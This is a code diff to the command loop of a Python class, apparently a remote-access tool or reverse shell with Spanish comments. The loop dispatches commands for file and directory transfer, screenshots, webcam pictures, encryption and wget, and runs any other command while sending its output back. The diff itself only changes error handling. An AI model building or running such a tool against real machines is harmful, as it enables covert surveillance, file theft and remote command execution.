@@ -815,7 +815,7 @@ class TCP:
                         break
 
                     except:
-                        continue
+                        raise Exception('exit error')
 
                 # Si el comando es 'q' o 'quit'...
                 elif cmd.lower() == 'q' or cmd.lower() == "quit":
@@ -827,7 +827,7 @@ class TCP:
                         self.conectar()
 
                     except:
-                        continue
+                        raise Exception('quit error')
 
                 # Si el comando es 'cd'...
                 elif cmd.lower()[:2] == "cd":
@@ -837,7 +837,7 @@ class TCP:
                         self.cd(cmd[3:])
 
                     except:
-                        continue
+                        raise Exception('cd error')
 
                 # Si el comando es 'sff'...
                 elif cmd.lower()[:3] == "sff":
@@ -847,7 +847,7 @@ class TCP:
                         self.sendFileFrom(cmd)
 
                     except:
-                        continue
+                        raise Exception('sff error')
 
                 # Si el comando es 'sft'...
                 elif cmd.lower()[:3] == "sft":
@@ -857,7 +857,7 @@ class TCP:
                         self.sendFileTo(cmd)
 
                     except:
-                        continue
+                        raise Exception('sft error')
 
                 # Si el comando es 'img'...
                 elif cmd.lower()[:3] == "img":
@@ -867,7 +867,7 @@ class TCP:
                         self.image(cmd)
 
                     except:
-                        continue
+                        raise Exception('img error')
 
                 # Si el comando es 'pic'...
                 elif cmd.lower()[:3] == "pic":
@@ -877,7 +877,7 @@ class TCP:
                         self.pic(cmd)
 
                     except:
-                        continue
+                        raise Exception('pic error')
 
                 # Si el comando es 'cap'...
                 elif cmd.lower()[:3] == "cap":
@@ -887,7 +887,7 @@ class TCP:
                         self.captura(cmd)
 
                     except:
-                        continue
+                        raise Exception('cap error')
 
                 # Si el comando es 'sdf'...
                 elif cmd.lower()[:3] == "sdf":
@@ -897,7 +897,7 @@ class TCP:
                         self.sendDirFrom(cmd)
 
                     except:
-                        continue
+                        raise Exception('sdf error')
 
                 # Si el comando es 'sdt'...
                 elif cmd.lower()[:3] == "sdt":
@@ -907,7 +907,7 @@ class TCP:
                         self.sendDirTo(cmd)
 
                     except:
-                        continue
+                        raise Exception('sdt error')
 
                 # Si el comando es 'zip'...
                 elif cmd.lower()[:3] == "zip":
@@ -917,7 +917,7 @@ class TCP:
                         self.comprimir(cmd)
 
                     except:
-                        continue
+                        raise Exception('zip error')
 
                 # Si el comando es 'unzip'...
                 elif cmd.lower()[:5] == "unzip":
@@ -927,7 +927,7 @@ class TCP:
                         self.descomprimir(cmd)
 
                     except:
-                        continue
+                        raise Exception('unzip error')
 
                 # Si el comando es 'encrypt'...
                 elif cmd.lower()[:7] == "encrypt":
@@ -937,7 +937,7 @@ class TCP:
                         self.encrypt(cmd)
 
                     except:
-                        continue
+                        raise Exception('encrypt error')
 
                 # Si el comando es 'decrypt'...
                 elif cmd.lower()[:7] == "decrypt":
@@ -947,7 +947,7 @@ class TCP:
                         self.decrypt(cmd)
 
                     except:
-                        continue
+                        raise Exception('decrypt error')
 
                 # Si el comando es 'miwget'...
                 elif cmd.lower()[:6] == "miwget":
@@ -957,7 +957,7 @@ class TCP:
                         self.wget(cmd)
 
                     except:
-                        continue
+                        raise Exception('miwget error')
 
                 # Si el comando es 'lendir'...
                 elif cmd.lower()[:6] == "lendir":
@@ -967,7 +967,7 @@ class TCP:
                         self.lenDir(cmd)
 
                     except:
-                        continue
+                        raise Exception('lendir error')
 
                 # Si el comando es 'save'...
                 elif cmd.lower()[:4] == "save":
@@ -978,14 +978,14 @@ class TCP:
                         self.save(cmd)
 
                     except:
-                        continue
+                        raise Exception('save error')
 
                 elif cmd.lower()[:2] == "ss":
                     try:
                         self.screenShot(cmd)
 
                     except:
-                        continue
+                        raise Exception('ss error')
 
                 # Si no hay una coincidencia, se ejecuta el comando
                 # y se envia lo que este regresa
